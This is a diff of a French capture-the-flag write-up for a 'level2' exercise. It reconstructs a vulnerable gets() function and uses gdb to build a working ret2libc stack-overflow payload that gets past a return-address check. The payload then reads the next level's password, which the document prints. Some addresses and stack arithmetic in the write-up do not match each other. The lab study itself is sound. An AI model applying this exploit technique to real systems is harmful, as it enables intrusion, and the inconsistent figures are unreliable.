@@ -18,41 +18,36 @@ Je tente de lancer le binaire level2 :
 
 ```
 $ ./level2
-
-```
-
-Il ne répond qu'avec un input :
-
-```
+(waiting for input)
 $ ./level2
 da
 da
 ```
 
-Je décide à partir de ce niveau d'utiliser les logiciels de décompilation présent sur [Dogbolt](https://dogbolt.org/?id=4128e95e-4279-47df-81a9-a69c5f209d01).
-
-En lui passant le binaire au préalable téléchargé, `Ghidra` me procure le code suivant :
+Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=4128e95e-4279-47df-81a9-a69c5f209d01) et en extrait une version probable du code :
 
 ```c
-void p() {
-  uint unaff_retaddr;
-  char buffer[76];
-  
-  fflush(stdout);
-  gets(buffer);
-  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
-    printf("(%p)\n", unaff_retaddr);
-                    // WARNING: Subroutine does not return
-    _exit(1);
-  }
-  puts(buffer);
-  strdup(buffer);
-  return;
+void p()
+{
+    fflush(stdout);
+
+    int buffer[16];
+    gets(buffer);
+
+    int check = buffer[20];
+    if ((check & 0xb0000000) == 0xb0000000)
+    {
+        printf("(%p)\n", check);
+        exit(1);
+    }
+
+    puts(buffer);
+    strdup(buffer);
 }
 
-void main(void) {
-  p();
-  return;
+int main()
+{
+    p();
 }
 ```
 
@@ -61,76 +56,137 @@ J'identifie :
 - une vulnérabilité possible avec `gets()`
 - la mise en place d'un 'safeguard' avec une condition if
 
-`Dogbolt` me propose aussi la version d'`Hexray` :
+Tout comme le précédent niveau, il s'agirait la de ré-écrire l'adresse de retour avec un exploit type `Ret2Libc`. Ici, le code ne lance pas shell, donc à l'inverse du précédent niveau, je vais devoir utiliser la véritable `Ret2Libc`, qui consiste à aller chercher l'adresse de `system()`, (éventuellement d'`exit()` pour que le programme termine correctement) et celle de `/bin/sh` dans la `libc`.
 
-```c
-char *p() {
-  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
-  const void *v2; // [esp+5Ch] [ebp-Ch]
-  unsigned int retaddr; // [esp+6Ch] [ebp+4h]
+L'exécution sera la même que pour `level1`, mais il faudra écrire ces 3 adresses dans le payload.
 
-  fflush(stdout);
-  gets(s);
-  v2 = (const void *)retaddr;
-  if ( (retaddr & 0xB0000000) == -1342177280 )
-  {
-    printf("(%p)\n", v2);
-    _exit(1);
-  }
-  puts(s);
-  return strdup(s);
-}
-```
+Pour trouver les trois adresses, ainsi que la taille de la stack, j'utilise `gdb` :
 
-Etant donné qu'aucun appel à `exec` ne semble être fait dans l'ensemble du code décompilé, je me penche sur un type d'attaque appellé [Ret2Libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc) et y trouve un schéma explicatif décrivant l'aspect du payload infecté nécessaire.
+```h
+$ gdb ./level2 -q
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
 
-Afin d'exploiter `gets()`, je note d'abord que le buffer 'non-exploitable' est de 76 bytes d'après l'analyse par `Ghidra`.
+(gdb) disas p
+Dump of assembler code for function p:
+    ...
+   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
+   0x08048535 <+97>:    mov    %eax,(%esp)
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave <---------------------- break ici
+   0x0804853e <+106>:   ret
+End of assembler dump.
 
-Je note que la version d'`Hexray` spécifie que :
+(gdb) b *p+105
+Breakpoint 1 at 0x804853d
 
-```c
-unsigned int retaddr; // [esp+6Ch] [ebp+4h]
-```
+(gdb) r
+Starting program: /home/user/level2/level2
+dab
+dab
 
-La partie `ebp+4` m'indique que la valeur de `retaddr` se trouve à `ebp + 4`.
+Breakpoint 1, 0x0804853d in p ()
 
-`ebp` correspondant à un pointeur sur la frame de la stack actuelle, cela signifie que l'adresse de retour de `p` se trouve 4 bytes plus loin que `ebp`. Je dois donc ajouter 4 bytes à mon payload infecté afin qu'il fasse 80 bytes, et que les 4 prochains pointent sur `retaddr`.
-
-Je compose donc mon payload infecté avec les informations suivantes :
-
-- 80 bytes de `NOP` (`\x90`) qui correspondent à des instructions de ne rien faire et s'assure du bon alignement de la mémoire
-
-- L'adresse de retour de `p` (trouvé avec `gdb` puis `disas main`) : `0x0804853e`
-
-- Une adresse vers `system()` dans la `libc`
-
-- Une adresse vers `exit()` dans la `libc`
-
-- Une adresse vers `"bin/sh"` dans la `libc`
-
-
-Pour trouver les trois dernières adresses, j'utilise `gdb` après avoir mis un `breakpoint` et avoir lancé le programme, afin de regarder sa mémoire :
-
-```
-# System
-(gdb) info function system
-0x08048360  system
-0x08048360  system@plt
+(gdb) info registers
+...
+esp            0xbffff6a0       0xbffff6a0
+ebp            0xbffff708       0xbffff708
 ...
 
-# Exit
-(gdb) info function exit
-0xb7e5ebe0  exit
-...
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
-# /bin/sh
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+
 (gdb) info proc mappings
-...
-0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-...
-(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+process 9921
+Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+    0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+    0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+    0x804a000  0x806b000    0x21000        0x0 [heap]
+    0xb7e2b000 0xb7e2c000     0x1000        0x0
+    0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so <--- libc
+    0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+    0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so <--- end
+    0xb7fd2000 0xb7fd5000     0x3000        0x0
+    0xb7fd9000 0xb7fdd000     0x4000        0x0
+    0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+    0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+    0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+    0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+    0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
 0xb7f8cc58
 1 pattern found.
+```
+
+Je peux commencer par calculer la taille de la stack comme au level précédent :
+
+`0xbffff728 - 0xbffff6c0 = 0x68 = 104` bytes
+
+Puis, soustraire par rapport à la position du buffer dans la stack (ici `0x4c(%ebp)`) soit
+
+`0x68 - 0x4c = 0x1C = 28` bytes, soit : `104 - 28 = 76` bytes afin d'atteindre `ebp`.
+
+J'ajoute 4 bytes pour écrire sur la `return address` de `main()`, soit 80 bytes.
+Mon payload échouerait si je le construisais de la même manière qu'au `level1` car la première adresse après l'overflow est utilisé par ce bout de code :
+
+```c
+    int check = buffer[20];
+    if ((check & 0xb0000000) == 0xb0000000)
+    {
+        printf("(%p)\n", check);
+        exit(1);
+    }
+```
+
+Afin de s'assurer qu'elle ne commence pas par le bit `0xb` (au travers d'une opération `AND`), or, mon payload ressemblerait à :
+
+```h
+"\x90" * 80 + "\xb7\xe6\xb0\x60" + "\xb7\xe6\xb0\x60" + "\xb7\xf8\xcc\x58"
+^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^
+buffer        adresse de system()  adresse d'exit()     adresse de "/bin/sh"
+```
+
+Ce qui serait problématique puisque la première adresse, qui est la nouvelle adresse de retour, commence par le bit `0xb`.
+
+Je dois donc ajouter une étape supplémentaire dans le payload afin que le payload ne se fasse pas "attraper" par cette condition.
+
+Une possibilité serait par exemple d'utiliser l'adresse d'un appel `ret`, par exemple celui de `p()`, puisqu'il cherchera ensuite la `return address`, qui sera la valeur suivante sur la stack, qui sera donc la suite du payload (et donc mon appel vers `system()`).
+
+Notez que l'adresse de `/bin/sh` est mise en dernière dans le payload car c'est la manière dont les arguments de fonctions sont placées dans la stack (tout en haut de celle-ci).
+
+Je cherche donc l'adresse de l'instruction de retour de `p()` :
+
+```h
+(gdb) disas p
+Dump of assembler code for function p:
+    ...
+   0x08048535 <+97>:    mov    %eax,(%esp)
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave
+   0x0804853e <+106>:   ret <------------------------ ici
+```
+
+Et je l'ajoute donc à mon payload, que je construit tel quel :
+
+```python
+"\x90" * 80
++ "\x08\x04\x85\x3e" <- return address of p, [::-1] is an inverted splice
++ "\xb7\xe6\xb0\x60" <- return address of system
++ "\x08\x04\x83\xd0" <- return address of exit
++ "\xb7\xf8\xcc\x58" <- return address of "bin/sh"
+```
+
+Et tente de l'utiliser sur le binaire :
+
+```bash
+$ (python -c 'print("\x90" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
+����������������������������������������������������������������>������������>`��X���
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
 Je construis mon payload en utilisant python, y ajoute une lecture du `.pass` du level3, et enfin le passe à l'executable `level2` :
